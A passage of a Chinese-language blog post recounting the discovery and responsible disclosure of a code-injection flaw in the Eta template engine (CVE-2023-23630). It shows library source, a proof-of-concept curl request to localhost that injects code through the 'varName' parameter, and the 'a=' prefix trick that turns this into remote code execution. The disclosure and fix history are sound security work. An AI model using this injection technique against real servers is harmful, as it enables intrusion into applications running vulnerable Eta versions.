class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// node_modules/eta/dist/eta.cjs:588</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">compile</span>(<span class="params">str, config</span>) {</span><br><span class="line">    <span class="keyword">var</span> options = <span class="title function_">getConfig</span>(config || {});</span><br><span class="line">    <span class="comment">/* ASYNC HANDLING */</span></span><br><span class="line">    <span class="comment">// The below code is modified from mde/ejs. All credit should go to them.</span></span><br><span class="line">    <span class="keyword">var</span> ctor = options.<span class="property">async</span> ? <span class="title function_">getAsyncFunctionConstructor</span>() : <span class="title class_">Function</span>;</span><br><span class="line">    <span class="comment">/* END ASYNC HANDLING */</span></span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">ctor</span>(options.<span class="property">varName</span>, <span class="string">'E'</span>, <span class="comment">// EtaConfig</span></span><br><span class="line">        <span class="string">'cb'</span>, <span class="comment">// optional callback</span></span><br><span class="line">        <span class="title function_">compileToString</span>(str, options)); <span class="comment">// eslint-disable-line no-new-func</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">catch</span> (e) {</span><br><span class="line">        <span class="keyword">if</span> (e <span class="keyword">instanceof</span> <span class="title class_">SyntaxError</span>) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="title class_">EtaErr</span>(<span class="string">'Bad template syntax\n\n'</span> +</span><br><span class="line">                e.<span class="property">message</span> +</span><br><span class="line">                <span class="string">'\n'</span> +</span><br><span class="line">                <span class="title class_">Array</span>(e.<span class="property">message</span>.<span class="property">length</span> + <span class="number">1</span>).<span class="title function_">join</span>(<span class="string">'='</span>) +</span><br><span class="line">                <span class="string">'\n'</span> +</span><br><span class="line">                <span class="title function_">compileToString</span>(str, options) +</span><br><span class="line">                <span class="string">'\n'</span> <span class="comment">// This will put an extra newline before the callstack for extra readability</span></span><br><span class="line">            );</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h4 id="compileToString"><a href="#compileToString" class="headerlink" title="compileToString"></a><code>compileToString</code></h4><p>看到這裡，我覺得 <code>compileToString</code> 太危險了。那個會被轉成 function 執行的字串竟然是用字串加法去處理的，那我就隨便找一段可控的字串去植入不就好了？</p><p>來看 :8，<code>config.varName</code> 是我們可控的字串，他只要 <code>config.useWith</code> 為真就會被接上去。來實際操作一次。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// node_modules/eta/dist/eta.cjs:389</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">compileToString</span>(<span class="params">str, config</span>) {</span><br><span class="line">    <span class="keyword">var</span> buffer = <span class="title function_">parse</span>(str, config);</span><br><span class="line">    <span class="keyword">var</span> res = <span class="string">"var tR='',__l,__lP"</span> +</span><br><span class="line">        (config.<span class="property">include</span> ? <span class="string">',include=E.include.bind(E)'</span> : <span class="string">''</span>) +</span><br><span class="line">        (config.<span class="property">includeFile</span> ? <span class="string">',includeFile=E.includeFile.bind(E)'</span> : <span class="string">''</span>) +</span><br><span class="line">        <span class="string">'\nfunction layout(p,d){__l=p;__lP=d}\n'</span> +</span><br><span class="line">        (config.<span class="property">useWith</span> ? <span class="string">'with('</span> + config.<span class="property">varName</span> + <span class="string">'||{}){'</span> : <span class="string">''</span>) +</span><br><span class="line">        <span class="title function_">compileScope</span>(buffer, config) +</span><br><span class="line">        (config.<span class="property">includeFile</span></span><br><span class="line">            ? <span class="string">'if(__l)tR='</span> +</span><br><span class="line">                (config.<span class="property">async</span> ? <span class="string">'await '</span> : <span class="string">''</span>) +</span><br><span class="line">                (<span class="string">"includeFile(__l,Object.assign("</span> + config.<span class="property">varName</span> + <span class="string">",{body:tR},__lP))\n"</span>)</span><br><span class="line">            : config.<span class="property">include</span></span><br><span class="line">                ? <span class="string">'if(__l)tR='</span> +</span><br><span class="line">                    (config.<span class="property">async</span> ? <span class="string">'await '</span> : <span class="string">''</span>) +</span><br><span class="line">                    (<span class="string">"include(__l,Object.assign("</span> + config.<span class="property">varName</span> + <span class="string">",{body:tR},__lP))\n"</span>)</span><br><span class="line">                : <span class="string">''</span>) +</span><br><span class="line">        <span class="string">'if(cb){cb(null,tR)} return tR'</span> +</span><br><span class="line">        (config.<span class="property">useWith</span> ? <span class="string">'}'</span> : <span class="string">''</span>);</span><br><span class="line">    <span class="keyword">if</span> (config.<span class="property">plugins</span>) {</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; config.<span class="property">plugins</span>.<span class="property">length</span>; i++) {</span><br><span class="line">            <span class="keyword">var</span> plugin = config.<span class="property">plugins</span>[i];</span><br><span class="line">            <span class="keyword">if</span> (plugin.<span class="property">processFnString</span>) {</span><br><span class="line">                res = plugin.<span class="title function_">processFnString</span>(res, config);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h4 id="Payload1"><a href="#Payload1" class="headerlink" title="Payload1"></a>Payload1</h4><p>把上面所說的東西實作，看看 <code>compileToString</code> 編譯出的 <code>res</code> 會長怎麼樣。</p><p>看到實際用字串加法做出來的字串 <code>res</code> 有我們的 <code>console.log("Ching367436")</code>，而且確定是在會被執行的地方，所以只要等他回傳到 <a href="#tryHandleCache"><code>tryHandleCache:8</code></a> 就會被執行。結果在跑到那之前竟然就噴錯了。</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload1</span></span><br><span class="line">curl <span class="string">'http://localhost/?useWith=1&amp;varName=console.log("Ching367436")'</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// res</span></span><br><span class="line"><span class="keyword">var</span> tR = <span class="string">''</span>, __l, __lP, include = E.<span class="property">include</span>.<span class="title function_">bind</span>(E), includeFile = E.<span class="property">includeFile</span>.<span class="title function_">bind</span>(E)</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">layout</span>(<span class="params">p, d</span>) { __l = p; __lP = d }</span><br><span class="line"><span class="keyword">with</span> (<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Ching367436"</span>) || {}) {</span><br><span class="line">    tR += <span class="string">'&lt;h1&gt;My favorite template engine is '</span></span><br><span class="line">    tR += E.<span class="title function_">e</span>(it.<span class="property">favorite</span>)</span><br><span class="line">    tR += <span class="string">' &lt;br&gt;&lt;/h1&gt;\n&lt;a href=\'app.js\'&gt;source&lt;/a&gt;\n'</span></span><br><span class="line">    <span class="keyword">if</span> (__l) tR = <span class="title function_">includeFile</span>(__l, <span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Ching367436"</span>), { <span class="attr">body</span>: tR }, __lP))</span><br><span class="line">    <span class="keyword">if</span> (cb) { <span class="title function_">cb</span>(<span class="literal">null</span>, tR) } <span class="keyword">return</span> tR</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h5 id="Payload1-Error"><a href="#Payload1-Error" class="headerlink" title="Payload1 Error"></a>Payload1 Error</h5><p>看到了錯誤訊息有有三行，:1及 :3 的很明顯的是 Eta 原生的錯誤，:5 感覺不是，上網查了一下發現是 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"><code>Function</code></a> 丟的錯，回想一下剛剛追到的一個地方有 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"><code>Function</code></a>，那就是 <code>compile</code>，所以過去看看。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Eta</span> <span class="title class_">Error</span>: <span class="title class_">Loading</span> <span class="attr">file</span>: views/index.<span class="property">eta</span> <span class="attr">failed</span>:</span><br><span class="line"></span><br><span class="line"><span class="title class_">Bad</span> template syntax</span><br><span class="line"></span><br><span class="line"><span class="title class_">Arg</span> string terminates parameters early</span><br><span class="line">======================================</span><br><span class="line"><span class="keyword">var</span> tR=<span class="string">''</span>,__l,__lP,include=E.<span class="property">include</span>.<span class="title function_">bind</span>(E),includeFile=E.<span class="property">includeFile</span>.<span class="title function_">bind</span>(E)</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">layout</span>(<span class="params">p,d</span>){__l=p;__lP=d}</span><br><span class="line"><span class="title function_">with</span>(<span class="params"><span class="variable language_">console</span>.log(<span class="string">"Ching367436"</span>)||{}</span>){tR+=<span class="string">'&lt;h1&gt;My favorite template engine is '</span></span><br><span class="line">tR+=E.<span class="title function_">e</span>(it.<span class="property">favorite</span>)</span><br><span class="line">tR+=<span class="string">' &lt;br&gt;&lt;/h1&gt;\n&lt;a href=\'app.js\'&gt;source&lt;/a&gt;\n'</span></span><br><span class="line"><span class="keyword">if</span>(__l)tR=<span class="title function_">includeFile</span>(__l,<span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Ching367436"</span>),{<span class="attr">body</span>:tR},__lP))</span><br><span class="line"><span class="keyword">if</span>(cb){<span class="title function_">cb</span>(<span class="literal">null</span>,tR)} <span class="keyword">return</span> tR}</span><br><span class="line"></span><br><span class="line">    at <span class="title class_">EtaErr</span> (node_modules/eta/dist/eta.<span class="property">cjs</span>:<span class="number">57</span>:<span class="number">15</span>)</span><br><span class="line">    at loadFile (node_modules/eta/dist/eta.<span class="property">cjs</span>:<span class="number">782</span>:<span class="number">15</span>)</span><br><span class="line">    at handleCache (node_modules/eta/dist/eta.<span class="property">cjs</span>:<span class="number">805</span>:<span class="number">12</span>)</span><br><span class="line">    at tryHandleCache (node_modules/eta/dist/eta.<span class="property">cjs</span>:<span class="number">821</span>:<span class="number">30</span>)</span><br><span class="line">    at <span class="title class_">View</span>.<span class="property">renderFile</span> [<span class="keyword">as</span> engine] (node_modules/eta/dist/eta.<span class="property">cjs</span>:<span class="number">919</span>:<span class="number">12</span>)</span><br><span class="line">    at <span class="title class_">View</span>.<span class="property">render</span> (node_modules/express/lib/view.<span class="property">js</span>:<span class="number">135</span>:<span class="number">8</span>)</span><br><span class="line">    at tryRender (node_modules/express/lib/application.<span class="property">js</span>:<span class="number">657</span>:<span class="number">10</span>)</span><br><span class="line">    at <span class="title class_">Function</span>.<span class="property">render</span> (node_modules/express/lib/application.<span class="property">js</span>:<span class="number">609</span>:<span class="number">3</span>)</span><br><span class="line">    at <span class="title class_">ServerResponse</span>.<span class="property">render</span> (node_modules/express/lib/response.<span class="property">js</span>:<span class="number">1039</span>:<span class="number">7</span>)</span><br><span class="line">    at app.<span class="property">js</span>:<span class="number">12</span>:<span class="number">9</span></span><br></pre></td></tr></table></figure></div><h4 id="compile-revisit"><a href="#compile-revisit" class="headerlink" title="compile revisit"></a><code>compile</code> revisit</h4><p>看到 :9 的 <code>ctor</code> 的地方，第一個參數是 <code>options.varName</code>，然後那在我的 <code>payload1</code> 裡面被改成了 <code>console.log("Ching367436")</code>。來看看這樣為何會有錯。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// node_modules/eta/dist/eta.cjs:588</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">compile</span>(<span class="params">str, config</span>) {</span><br><span class="line">    <span class="keyword">var</span> options = <span class="title function_">getConfig</span>(config || {});</span><br><span class="line">    <span class="comment">/* ASYNC HANDLING */</span></span><br><span class="line">    <span class="comment">// The below code is modified from mde/ejs. All credit should go to them.</span></span><br><span class="line">    <span class="keyword">var</span> ctor = options.<span class="property">async</span> ? <span class="title function_">getAsyncFunctionConstructor</span>() : <span class="title class_">Function</span>;</span><br><span class="line">    <span class="comment">/* END ASYNC HANDLING */</span></span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">ctor</span>(options.<span class="property">varName</span>, <span class="string">'E'</span>, <span class="comment">// EtaConfig</span></span><br><span class="line">        <span class="string">'cb'</span>, <span class="comment">// optional callback</span></span><br><span class="line">        <span class="title function_">compileToString</span>(str, options)); <span class="comment">// eslint-disable-line no-new-func</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">catch</span> (e) {</span><br><span class="line">        <span class="keyword">if</span> (e <span class="keyword">instanceof</span> <span class="title class_">SyntaxError</span>) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="title class_">EtaErr</span>(<span class="string">'Bad template syntax\n\n'</span> +</span><br><span class="line">                e.<span class="property">message</span> +</span><br><span class="line">                <span class="string">'\n'</span> +</span><br><span class="line">                <span class="title class_">Array</span>(e.<span class="property">message</span>.<span class="property">length</span> + <span class="number">1</span>).<span class="title function_">join</span>(<span class="string">'='</span>) +</span><br><span class="line">                <span class="string">'\n'</span> +</span><br><span class="line">                <span class="title function_">compileToString</span>(str, options) +</span><br><span class="line">                <span class="string">'\n'</span> <span class="comment">// This will put an extra newline before the callstack for extra readability</span></span><br><span class="line">            );</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h5 id="ctor"><a href="#ctor" class="headerlink" title="ctor"></a><code>ctor</code></h5><p>上面的 <code>ctor</code> 相當於 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"><code>Function</code></a>，把我們的東西放進 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"><code>Function</code></a> 看看會發生什麼事。可以看到噴的錯誤訊息跟前面噴的 <code>Arg string terminates parameters early</code> 是一樣的。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>(<span class="string">'console.log("Ching367436")'</span>, <span class="string">'cb'</span>, res)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Error message</span></span><br><span class="line"><span class="title class_">Uncaught</span> <span class="title class_">SyntaxError</span>: <span class="title class_">Arg</span> string terminates parameters early</span><br></pre></td></tr></table></figure></div><h6 id="Function"><a href="#Function" class="headerlink" title="Function"></a><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"><code>Function</code></a></h6><p>來看看 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"><code>Function</code></a> 的各種用法。 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"><code>Function</code></a> 的最後一個參數放的是 function body，前面幾個參數是要給那個 function body 的參數，可以看到最後出來的結果會回傳一個從字串變成的 function。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>(<span class="string">'a, b'</span>, <span class="string">'c'</span>, <span class="string">'console.log(a, b, c)'</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// output</span></span><br><span class="line">ƒ <span class="title function_">anonymous</span>(<span class="params">a, b,c</span></span><br><span class="line"><span class="params"></span>) {</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, c)</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><p>如果今天參數的部分被換成了不合理的值，像是下面這樣，就會噴出前面看到的錯。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>(<span class="string">'console.log(a, b, c)'</span>, <span class="string">'c'</span>, <span class="string">'console.log(a, b, c)'</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// output</span></span><br><span class="line"><span class="title class_">Uncaught</span> <span class="title class_">SyntaxError</span>: <span class="title class_">Arg</span> string terminates parameters early</span><br></pre></td></tr></table></figure></div><p>所以看到這邊，覺得控 <code>options.varName</code> 的路應該是沒辦法了，所以去找了其他可控的東西，可是也沒看到其他會被放進去的字串。所以在發表專題前就在這個裡面找了一個 ZeroDay XSS 跟已經有 CVE 的 <a class="link" href="https://securitylab.github.com/advisories/GHSL-2021-023-squirrelly/#technical-summary">Squirrelly ZeroDay RCE <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，配上 Entroy 的 <a class="link" href="https://entroychang.github.io/2023/03/06/NodeJS-template-CVEs#ejs-template">EJS ZeroDay RCE <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。還是成功的拿下了最佳專題。</p><h4 id="轉機"><a href="#轉機" class="headerlink" title="轉機"></a>轉機</h4><p>然後我的 <code>payload1</code> 其實只要 <code>varName</code> 的值前面加上 <code>a=</code>，<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"><code>Function</code></a> 那裡就不會噴錯了，因為 <code>a=console.log(123)</code> 是合理的參數。</p><p>這樣就可以執行到前面的 <a href="#tryHandleCache"><code>tryHandleCache:8</code></a> 的 <code>templateFn(data, options, cb)</code>，<code>templateFn</code> 就是 <a href="#ctor"><code>ctor</code></a> 所產出的 function，所以這樣就 RCE 了。</p><p><img src="/ais3-2022-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/splitline-yyds.png" alt="splitline"></p><h2 id="後續"><a href="#後續" class="headerlink" title="後續"></a>後續</h2><p>事後要把 Eta ZeroDay RCE 回報給作者，所以查了一下作者，結果看到他跟 <a class="link" href="https://squirrelly.js.org/">SquirrellyJS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是同個作者，然後兩個都有類似，甚至一模一樣的 RCE 的洞。</p><h3 id="回報"><a href="#回報" class="headerlink" title="回報"></a>回報</h3><p>回報的是 Github 上的洞，所以我先去看了 <a class="link" href="https://github.com/eta-dev/eta/security/policy">Eta 的 security policy <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，然後是空的。感覺這個也不太適合直接發 issue，最後在作者網站的 <a class="link" href="https://bengubler.com/#contact">Contact <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 那邊看到了聯絡管道，決定用寫信的來回報。</p><p>接著就要來寫漏洞報告了，想了一下要怎麼寫，想起之前 Cyku 大大回報的同個類型的<a class="link" href="https://github.com/pugjs/pug/issues/3312">洞 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。所以就照著把 proof of concept、detail、mitigation 三個部分寫了起來，最後寫出了<a class="link" href="https://hackmd.io/@Ching367436/SkkvuMAoi">這篇漏洞報告 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。然後就寄給作者了。</p><p>隔了一天後 Eta 推出了 <a class="link" href="https://github.com/eta-dev/eta/releases/tag/v2.0.0">v2.0.0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，Eta 發佈了 <a class="link" href="https://github.com/eta-dev/eta/security/advisories/GHSA-xrh7-m5pp-39r6">security advisory <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><p>然後收到了作者的回信。</p><img src="/ais3-2022-最佳專題/eta-reply.png" alt="Eta reply" style="width: 22em;"><p>又隔了兩天 Github 發給了這個洞 <a class="link" href="https://www.cve.org/CVERecord?id=CVE-2023-23630">CVE-2023-23630 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><img src="/ais3-2022-最佳專題/github-issued-cve.png" alt="Github issued CVE" style="width: 22em;"><p>同一天出現了 <a class="link" href="https://www.cve.org/CVERecord?id=CVE-2022-25967">CVE-2022-25967 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的 <a class="link" href="https://github.com/advisories/GHSA-mf6x-hrgr-658f">security advisory <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。所以可能有人已經回報過這個洞了。在回報這個洞之前，我已先查過了作者，他因為有事，兩年無法維護開源專案，而 <a class="link" href="https://www.cve.org/CVERecord?id=CVE-2022-25967">CVE-2022-25967 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 正是那個期間的事情，所以可能才會被作者略過。我是挑在作者回來的時候回報的，所以作者馬上就修好這個洞了。</p><p>來看看他修補的 <a class="link" href="https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd">commit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，做的修改就是不再把 <a href="#renderFile"><code>renderFile</code></a> 的 <code>data</code> merge 進 <code>renderConfig</code> 裡面，所以 <code>renderConfig</code> 就變成了使用者不可控的東西，所以漏洞就確實被從根源修補好了。</p><h4 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h4><p>2023/01/26: 回報漏洞給作者。</p><p>2023/01/28: Eta 釋出 v2.0.0 修補了漏洞，發布 <a class="link" href="https://github.com/eta-dev/eta/security/advisories/GHSA-xrh7-m5pp-39r6">security advisory <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><p>2023/01/30: Github 發給了這個漏洞 <a class="link" href="https://www.cve.org/CVERecord?id=CVE-2023-23630">CVE-2023-23630 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><p>2023/01/30: <a class="link" href="https://www.cve.org/CVERecord?id=CVE-2022-25967">CVE-2022-25967 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的 <a class="link" href="https://github.com/advisories/GHSA-mf6x-hrgr-658f">security advisory <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 被發布了。</p><p>2023/04/08: 我把<a class="link" href="https://hackmd.io/@Ching367436/SkkvuMAoi">漏洞報告 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>公開。</p><h3 id="修補後的問題"><a href="#修補後的問題" class="headerlink" title="修補後的問題"></a>修補後的問題</h3><p>作者把洞修補好之後，就有東西開始壞掉了。</p><p><a class="link" href="https://github.com/eta-dev/eta/issues/215">2.0.0 breaks Express.js res.render views configuration <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 發生的原因在於 Eta 不會再從 Express 放下來的 <code>data</code> 去找 <code>config</code> 了。所以作者在文檔中把設定 template file 資料夾的的地方做了改動，也就是我畫起來的地方。來看看發生了什麼事。</p><p><img src="/ais3-2022-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/eta-2.0.0-release-note.png" alt="Eta v2.0.0 release note"></p><h4 id="views"><a href="#views" class="headerlink" title="views"></a><code>views</code></h4><p>看到原本的 <code>app.set("views", "./views")</code> 被改成 <code>eta.configure({ views: "./views", cache: true })</code>。前者是設定了 Express 的 template file 的資料夾，不過到了 v2.0.0，Eta 不會再吃 Express 傳下來的這項資訊，所以作者要大家改成直接設定在 Eta 上面，Eta 才吃得到設定。可是這樣會變成 Express 那邊壞掉，因為 Express 也需要這項資訊。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Change THIS:</span></span><br><span class="line"><span class="keyword">var</span> eta = <span class="built_in">require</span>(<span class="string">"eta"</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">"view engine"</span>, <span class="string">"eta"</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">"views"</span>, <span class="string">"./views"</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">"view cache"</span>, <span class="literal">true</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// To THIS:</span></span><br><span class="line"><span class="keyword">var</span> eta = <span class="built_in">require</span>(<span class="string">"eta"</span>)</span><br><span class="line">eta.<span class="title function_">configure</span>({ <span class="attr">views</span>: <span class="string">"./views"</span>, <span class="attr">cache</span>: <span class="literal">true</span> })</span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">"eta"</span>, eta.<span class="property">renderFile</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">"view engine"</span>, <span class="string">"eta"</span>)</span><br></pre></td></tr></table></figure></div><h4 id="解決修補後的問題"><a href="#解決修補後的問題" class="headerlink" title="解決修補後的問題"></a>解決修補後的問題</h4><p>作者提出了兩個<a class="link" href="https://github.com/eta-dev/eta/issues/215#issuecomment-1409553251">解決方案 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><p>第一個方案是 Eta 再去從 Express 傳下來的東西去拿這項資訊，不過這被我否決了，因為這樣做在<a class="link" href="https://github.com/eta-dev/eta/issues/215#issuecomment-1409697871">某些情況下會可以 RCE <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><p>第二個方案是叫使用者 Express 及 Eta 兩邊都設定一次同樣的東西，變成下面這樣。雖然比較麻煩，但這樣比較安全。我們最後決定採用這個，所以後來 v2.0.0 的 <a class="link" href="https://github.com/eta-dev/eta/releases/tag/v2.0.0">release note <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 更新成了現在的樣子。</p><p>我認為 Express 一開始在做 template engine 的接口時就該讓 <code>data</code>  <code>config</code> 分開，才不會造成現在那麼麻煩，以及引發這一類型問題。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// To THIS:</span></span><br><span class="line"><span class="keyword">var</span> eta = <span class="built_in">require</span>(<span class="string">"eta"</span>)</span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">"eta"</span>, eta.<span class="property">renderFile</span>)</span><br><span class="line">eta.<span class="title function_">configure</span>({  <span class="attr">views</span>: <span class="string">"./views"</span>, <span class="attr">cache</span>: <span class="literal">true</span> }) <span class="comment">// configure eta</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">"views"</span>, <span class="string">"./views"</span>) <span class="comment">// configure 